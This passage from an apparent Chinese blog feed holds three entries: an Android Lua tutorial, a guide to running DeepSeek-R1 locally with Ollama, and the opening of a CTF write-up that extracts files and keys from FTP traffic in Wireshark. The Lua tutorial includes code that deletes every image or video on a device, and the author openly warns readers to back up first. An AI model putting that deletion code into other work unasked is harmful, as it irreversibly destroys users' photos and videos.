的缩写，中文译为软件开发工具包。它是一组用于开发软件的工具、库、示例代码和文档的集合，旨在帮助开发者更容易地构建、集成和使用特定的软件或服务。</p></blockquote><p>不同安卓版本对应不同的sdk，参考文章 <a href="https://blog.csdn.net/qq_42690281/article/details/131640670">Android版本与SDK/API版本、JDK对应关系</a></p><p>target_sdk过高，对文件操作不能只在<code>user_permission</code> 加 <code>WRITE_EXTERNAL_STORAGE</code> ，需要动态申请权限，也就是在程序运行时申请权限，诸如平常安装新应用，弹窗申请调用xxxx，申请xxxx访问权限一样</p><p>这里是动态申请权限模板</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--Android动态权限申请,回调和检查</span></span><br><span class="line"><span class="comment">--权限的申请应当遵循“谁需要，谁申请”，权限通过则执行，不通过则不执行</span></span><br><span class="line"><span class="comment">--既不应该一启动就全申请，也不应该申请不应需要的权限</span></span><br><span class="line"><span class="comment">--假设有某个需求需要权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;某个需要权限的操作&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--定义请求码</span></span><br><span class="line"><span class="keyword">local</span> permissionRequestCode = <span class="number">10</span></span><br><span class="line"><span class="comment">--申请权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestPermissions</span><span class="params">(permissions, requestCode)</span></span></span><br><span class="line">  <span class="keyword">local</span> ActivityCompat = luajava.bindClass <span class="string">&quot;androidx.core.app.ActivityCompat&quot;</span></span><br><span class="line">  <span class="keyword">return</span> ActivityCompat.requestPermissions(activity, permissions, requestCode);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--申请权限的回调在这里执行</span></span><br><span class="line">onRequestPermissionsResult=<span class="function"><span class="keyword">function</span><span class="params">(requestCode, permissions, grantResults)</span></span></span><br><span class="line">  <span class="keyword">local</span> PackageManager = luajava.bindClass <span class="string">&quot;android.content.pm.PackageManager&quot;</span></span><br><span class="line">  <span class="comment">--判断是不是自己的权限申请</span></span><br><span class="line">  <span class="keyword">if</span> requestCode==permissionRequestCode <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> Manifest = luajava.bindClass <span class="string">&quot;android.Manifest&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">0</span>,#permissions<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> grantResults[i] == PackageManager.PERMISSION_GRANTED <span class="keyword">then</span></span><br><span class="line">        <span class="comment">--print(permissions[i]..&quot;权限通过&quot;)</span></span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="comment">--假如需要的权限被通过了</span></span><br><span class="line">        <span class="keyword">if</span> permissions[i]==Manifest.permission.READ_EXTERNAL_STORAGE <span class="keyword">then</span></span><br><span class="line">          fun()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">        <span class="comment">--print(permissions[i]..&quot;权限拒绝&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> permissions[i]==Manifest.permission.READ_EXTERNAL_STORAGE <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;执行fun()需要的权限未通过&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;申请了&quot;</span>..#permissions..<span class="string">&quot;个权限，通过了&quot;</span>..count..<span class="string">&quot;个权限&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--示例</span></span><br><span class="line"><span class="comment">--要申请的权限列表，请写成常量以免自己写错</span></span><br><span class="line"><span class="comment">--所有的权限常量定义在Manifest的内部类permission里，写法如下</span></span><br><span class="line"><span class="keyword">local</span> Manifest = luajava.bindClass <span class="string">&quot;android.Manifest&quot;</span></span><br><span class="line"><span class="comment">--以储存权限为例</span></span><br><span class="line"><span class="keyword">local</span> requirePermissions =</span><br><span class="line">&#123;</span><br><span class="line">  Manifest.permission.WRITE_EXTERNAL_STORAGE,</span><br><span class="line">  Manifest.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--发起请求</span></span><br><span class="line">requestPermissions(requirePermissions, permissionRequestCode)</span><br><span class="line"><span class="comment">--检查权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPermission</span><span class="params">(permission)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>==activity.checkSelfPermission(permission)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--单纯检查一下有没有指定权限</span></span><br><span class="line"><span class="keyword">local</span> flag = checkPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;WRITE_EXTERNAL_STORAGE检查结果&quot;</span>..<span class="built_in">tostring</span>(flag))</span><br></pre></td></tr></table></figure><p>将这些添加到 <code>./main.lua</code> 中即可</p><p><code>./main.lua</code> 完整代码如下</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">&quot;java.lang.*&quot;</span>,<span class="string">&quot;java.util.*&quot;</span></span><br><span class="line">import <span class="string">&quot;android.os.*&quot;</span>,<span class="string">&quot;android.app.*&quot;</span></span><br><span class="line">import <span class="string">&quot;android.content.*&quot;</span>,<span class="string">&quot;android.provider.*&quot;</span></span><br><span class="line">activity &#123;</span><br><span class="line">  Title = res.<span class="built_in">string</span>.app_title,</span><br><span class="line">  ContentView = res.layout.main</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--Android动态权限申请,回调和检查</span></span><br><span class="line"><span class="comment">--权限的申请应当遵循“谁需要，谁申请”，权限通过则执行，不通过则不执行</span></span><br><span class="line"><span class="comment">--既不应该一启动就全申请，也不应该申请不应需要的权限</span></span><br><span class="line"><span class="comment">--假设有某个需求需要权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;某个需要权限的操作&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--定义请求码</span></span><br><span class="line"><span class="keyword">local</span> permissionRequestCode = <span class="number">10</span></span><br><span class="line"><span class="comment">--申请权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestPermissions</span><span class="params">(permissions, requestCode)</span></span></span><br><span class="line">  <span class="keyword">local</span> ActivityCompat = luajava.bindClass <span class="string">&quot;androidx.core.app.ActivityCompat&quot;</span></span><br><span class="line">  <span class="keyword">return</span> ActivityCompat.requestPermissions(activity, permissions, requestCode);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--申请权限的回调在这里执行</span></span><br><span class="line">onRequestPermissionsResult=<span class="function"><span class="keyword">function</span><span class="params">(requestCode, permissions, grantResults)</span></span></span><br><span class="line">  <span class="keyword">local</span> PackageManager = luajava.bindClass <span class="string">&quot;android.content.pm.PackageManager&quot;</span></span><br><span class="line">  <span class="comment">--判断是不是自己的权限申请</span></span><br><span class="line">  <span class="keyword">if</span> requestCode==permissionRequestCode <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> Manifest = luajava.bindClass <span class="string">&quot;android.Manifest&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">0</span>,#permissions<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> grantResults[i] == PackageManager.PERMISSION_GRANTED <span class="keyword">then</span></span><br><span class="line">        <span class="comment">--print(permissions[i]..&quot;权限通过&quot;)</span></span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="comment">--假如需要的权限被通过了</span></span><br><span class="line">        <span class="keyword">if</span> permissions[i]==Manifest.permission.READ_EXTERNAL_STORAGE <span class="keyword">then</span></span><br><span class="line">          fun()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">        <span class="comment">--print(permissions[i]..&quot;权限拒绝&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> permissions[i]==Manifest.permission.READ_EXTERNAL_STORAGE <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;执行fun()需要的权限未通过&quot;</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;申请了&quot;</span>..#permissions..<span class="string">&quot;个权限，通过了&quot;</span>..count..<span class="string">&quot;个权限&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--示例</span></span><br><span class="line"><span class="comment">--要申请的权限列表，请写成常量以免自己写错</span></span><br><span class="line"><span class="comment">--所有的权限常量定义在Manifest的内部类permission里，写法如下</span></span><br><span class="line"><span class="keyword">local</span> Manifest = luajava.bindClass <span class="string">&quot;android.Manifest&quot;</span></span><br><span class="line"><span class="comment">--以储存权限为例</span></span><br><span class="line"><span class="keyword">local</span> requirePermissions =</span><br><span class="line">&#123;</span><br><span class="line">  Manifest.permission.WRITE_EXTERNAL_STORAGE,</span><br><span class="line">  Manifest.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--发起请求</span></span><br><span class="line">requestPermissions(requirePermissions, permissionRequestCode)</span><br><span class="line"><span class="comment">--检查权限</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPermission</span><span class="params">(permission)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>==activity.checkSelfPermission(permission)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--单纯检查一下有没有指定权限</span></span><br><span class="line"><span class="keyword">local</span> flag = checkPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;WRITE_EXTERNAL_STORAGE检查结果&quot;</span>..<span class="built_in">tostring</span>(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteMedia</span><span class="params">(type)</span></span></span><br><span class="line">  <span class="keyword">local</span> uri</span><br><span class="line">  <span class="keyword">local</span> Type</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在清理图片&quot;</span>)</span><br><span class="line">    Type = <span class="string">&quot;图片&quot;</span></span><br><span class="line">    uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;vedio&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="comment">--print(&quot;正在清理视频&quot;)</span></span><br><span class="line">    Type = <span class="string">&quot;视频&quot;</span></span><br><span class="line">    uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> contentResolver = activity.getContentResolver()</span><br><span class="line">  <span class="keyword">local</span> rowsDeleted = contentResolver.delete(uri, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">tostring</span>(rowsDeleted)..<span class="string">&quot;个&quot;</span>..Type..<span class="string">&quot;清理完毕&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">imgclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  deleteMedia(<span class="string">&quot;image&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">movclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  deleteMedia(<span class="string">&quot;vedio&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>这样一个简单的删除全部图片/视频程序便写好了</p><p><strong>注意：调试时候默认获得权限，无需弹窗申请</strong></p><p><strong>如果在自己手机测试该程序，一定要提前备份文件！！！</strong></p><h2 id="构建导出">构建导出</h2><p>在右上角 <code>竖着的三个点</code> 选择 <code>项目...</code> → <code>构建</code></p><p>会自动跳到 NeLuaJ+ Builder 中，选择你的项目 → <code>下一步</code> → <code>开始</code></p><p>构建的apk位于 <code>/storage/emulated/0/LuaJ/Builds</code></p><h2 id="美化布局">美化布局</h2><p>如果想要简单美化，参考最开头推荐阅读的那篇文章，这里只做隐藏标题处理</p><p>在<code>./main.lua</code>中添加</p><p><code>activity.getSupportActionBar().hide() </code></p>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下使用Ollama部署DeepSeek-R1</title>
      <link href="/posts/8c718629.html"/>
      <url>/posts/8c718629.html</url>
      
        <content type="html"><![CDATA[<p><strong>今天是除夕，祝大家新年快乐！</strong></p><h1>Windows下使用Ollama部署DeepSeek-R1</h1><p>DeepSeek R1 的成绩完全对标 OpenAI o1，与之前的 DeepSeek V3 相比大幅提升。家用电脑可以在本地部署R1的蒸馏版本(阉割版)。如果想要体验满血版 R1 ，只需要访问官网即可。</p><p><strong>主要工具</strong>：Ollama，Chatbox，谷歌浏览器/edge</p><blockquote><p>Ollama 是一款用于本地运行大语言模型的工具，支持对 LLM 模型进行管理、训练和推理。通过 Ollama，用户可以在本地机器上运行 GPT-4、BERT 等模型，并利用 Ollama 提供的 Web 界面或客户端 API 进行交互。此外，Ollama 还提供了便捷的 Python 和 Java API，让开发者能够轻松地将其集成到各类应用中。</p></blockquote><p>chatbox可以提供ui，作为附加选项</p><p>Ollama：<a href="https://ollama.com/">https://ollama.com/</a></p><p>Chatbox：<a href="https://chatboxai.app/zh">https://chatboxai.app/zh</a></p><h2 id="下载Ollama-模型">下载Ollama &amp; 模型</h2><h3 id="Ollama安装">Ollama安装</h3><p>Ollama可以在官网下载，但是速度非常感人，700多MB在科学上网加持下都要好久</p><p>这里使用github镜像加速下载，Ollama github仓库为：<a href="https://github.com/ollama/ollama">https://github.com/ollama/ollama</a></p><p>在release中找到最新版 .exe 文件</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/ollama_github.png" alt="image-20250128152306341"></p><p>下载速度可能还是很慢，可以使用 github加速站 <a href="https://github.akams.cn/">https://github.akams.cn/</a></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/github_proxy.png" alt="image-20250128152459593"></p><p>将下载链接粘贴到输入框，左侧选择节点后开始下载。如果某个节点很慢，可以多试几个。下载后安装即可。</p><p>安装好后打开命令行，输入 <code>ollama</code> ，出现如下输出则为安装成功。</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/ollama_show.png" alt="image-20250128155201507"></p><h3 id="更改-Ollama-位置">更改 Ollama 位置</h3><p>Ollama 本体和模型的默认位置都在C盘</p><p>Ollama 默认安装位置在用户文件夹下的 <code>\AppData\Local\Programs\Ollama</code> 里，如果想要<strong>迁移Ollama到其他位置</strong>，需要修改<strong>用户变量</strong></p><p>打开用户变量中的 <code>Path</code></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/path.png" alt="image-20250128153853969"></p><p>进入这个路径，里面是Ollama本体</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/ollama_body.png" alt="image-20250128153941620"></p><p>将所有文件复制到目标文件夹，比如要迁移到 <code>E:\Ollama</code></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/expected_path.png" alt="image-20250128154056584"></p><p>将原本 <code>Path</code> 中Ollama路径替换为新路径</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/new_path.png" alt="image-20250128154150932"></p><p>重启Ollama即可。</p><p>Ollama 默认模型下载位置在用户文件夹下的 <code>.ollama/models</code> 里，如果想要改<strong>模型默认位置</strong>，需要添加系统变量。</p><p><strong>变量名</strong>：OLLAMA_MODELS</p><p><strong>变量值</strong>：完整路径</p><p><strong>设置好变量后重启生效</strong></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/models_path.png" alt="image-20250128152754607"></p><p>重启后再次打开命令行，输入 <code>ollama</code> ，如果输出正常则为迁移成功。</p><blockquote><p>另一种验证迁移成功的方式：在任务管理器中彻底关闭ollama，然后命令行运行模型，在任务管理器中打开新的ollama进程位置，如果是期望位置则为迁移成功</p></blockquote><h3 id="下载模型">下载模型</h3><p>进入Ollama官网的上方Models，找到 <a href="https://ollama.com/library/deepseek-r1">deepseek-r1</a></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/download_model.png" alt="image-20250128155534684"></p><p>deepseek-r1模型有蒸馏版本(1.5b-70b)，以及满血版本671b。</p><p>b：指billion(十亿)，1.5b即为有15亿参数。参数越多，运行消耗的资源越多。</p><p>以天选五pro为例，验证拉格朗日定理时，14b所消耗的资源如下：</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/14b_test.png" alt="image-20250128160501055"></p><p>32b消耗资源如下(明显卡顿，出字速度慢)：</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/32b_test.png" alt="image-20250128164901910"></p><p>如果配置不高，可以考虑1.5b/7b 入门体验，配置尚可可以选择8b-32b，高端配置(大概服务器级别了吧?)可以选择70b甚至更高。当然，参数越多，效果也越好。</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/xb_list.png" alt="image-20250128155645555"></p><p>列表中b-GB对应关系是参数与磁盘大小的关系，而不是与占用内存大小的关系。</p><p>选择恰当的模型后，在选择框右侧会出现对应命令。在命令行输入后等待下载完成即可。以32b为例，对用的命令为：<code>ollama run deepseek-r1:32b</code></p><p>注：下载可以<code>ctrl+c</code>暂停，再次运行run可以继续下载。科学上网下载模型很快</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/download_models.png" alt="image-20250128164326212"></p><p>出现最后一行提示词即为下载成功，但是在这个页面只能输入英文，想要输入中文需要退出重进</p><p>退出：<code>ctrl+d</code>，或者输入 <code>/bye</code></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/exit.png" alt="image-20250128164547800"></p><h2 id="本地客户端Chatbox-ui界面-无法联网">本地客户端Chatbox ui界面 (无法联网)</h2><p>下载Chatbox，打开设置页面</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/chatbox.png" alt="image-20250128170105280"></p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/chatbox_settings.png" alt="image-20250128170830322"></p><p>如果选择OLLAMA API作为模型提供方，但是模型列表没有下载的模型，先在命令行中使用命令：<code>ollama list</code> 查看模型列表，如果没有模型，则需要 <code>ollama run 模型</code> 来下载。</p><p>如果有下载的模型但是列表没有，那么检查小托盘是否有ollama图标(ollama是否在运行)，如果ollama没有在运行，则在命令行中使用run命令运行任意一个下载好的模型后，重新打开chatbox设置页面即可。</p><p>chatbox目前不支持deepseek联网查询</p><h2 id="浏览器插件-Page-Assist-web-ui界面-可以联网">浏览器插件 Page Assist web-ui界面 (可以联网)</h2><p>保证后台运行ollama</p><p>科学上网下载插件：<a href="https://chromewebstore.google.com/detail/page-assist-a-web-ui-for/jfgfiigpkhlkbnfnbobbkinehhfdhndo">https://chromewebstore.google.com/detail/page-assist-a-web-ui-for/jfgfiigpkhlkbnfnbobbkinehhfdhndo</a></p><p>进入插件界面，右上角齿轮进入设置。侧边栏第一个设置项中，前两个选项为语言设置，可以全设为中文；下方设置搜索引擎，目前测试搜狗能完成国内联网搜索(但是有广告)。<br>RAG设置里选择常用的模型。</p><p><img src="/assets/post_img/AI/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Ollama%E9%83%A8%E7%BD%B2DeepSeek-R1/online_test.png" alt="online_test"></p><p>完结撒花</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用wireshark从FTP流量中提取文件</title>
      <link href="/posts/86ffe598.html"/>
      <url>/posts/86ffe598.html</url>
      
        <content type="html"><![CDATA[<h1>利用wireshark从FTP流量中提取文件</h1><blockquote><p>FTP协议也是通过TCP协议来承载，wireshark对于这个流量包解析成了三种协议来显示：TCP,FTP,FTP-DATA。wireshark把带有FTP控制信息的解析为FTP，对于至传输了文件内容或者命令执行结果的FTP数据包解析称FTP-DATA。</p></blockquote><p>使用wireshark打开流量包，过滤 <code>ftp-data</code></p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/1.png" alt="image-20241222122027779"></p><p>在右侧可以看到有四个文件</p><ul class="lvl-0"><li class="lvl-2"><p>key.zip</p></li><li class="lvl-2"><p>pub.key</p></li><li class="lvl-2"><p>test.key</p></li><li class="lvl-2"><p>____.pdf （乱码了）</p></li></ul><p>依次提取文件</p><h2 id="key-zip">key.zip</h2><p>追踪TCP流，用原始数据显示</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/2.png" alt="image-20241222123040079"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">504b0304140000000000f7590949a29009868000000080000000070000006b65792e7478741205c9b3b40c16ee4f6691ad71f680cd3f3a5c98f10e3338feb4937a964ca10dd4c2ba97e24ae1d9e21fe9f5d3540320f147687e4d1ca09764d67d0fea5616558053adaec680c1d4120fa050e1682d05aa448fe5d80ccae5847eda6643ae1fde09b3a1339a3a9d55cc936da2760134269937cd7b724b705672516cd7fec4ea13504b01021400140000000000f7590949a290098680000000800000000700000000000000000020000000000000006b65792e747874504b0506000000000100010035000000a50000000000</span><br></pre></td></tr></table></figure><p>导出，后缀改为 <code>.zip</code></p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/3.png" alt="image-20241222123238788"></p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/4.png" alt="image-20241222123411251"></p><p>发现文件乱码，需要进一步解密。目前信息有限，继续提取文件</p><h2 id="pub-key">pub.key</h2><p>继续追踪对应TCP流，在UTF-8中可以看到公钥</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/5.png" alt="image-20241222123620160"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD0UN0A+70iM0VCJ1ni0n/U1BRj</span><br><span class="line">0u8yMWH4Qi+xTbjHgbE7wOukOaO+2PyQXiqIzZnf5jCkJuVDYjALGcKrZM4OCQBB</span><br><span class="line">d85B/LTc36XZ7JVfX5kGy5tIR3tquuPIVKNdAsHlSqh9S7YSS39RdnSa5rOUyGhr</span><br><span class="line">LzxwzzM9IO4e+QQ+CQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.ssleye.com/ssltool/pub_asysi.html">在线工具</a>解析</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/6.png" alt="image-20241222123825861"></p><h2 id="test-key">test.key</h2><p>和pub.key步骤相同，得到私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 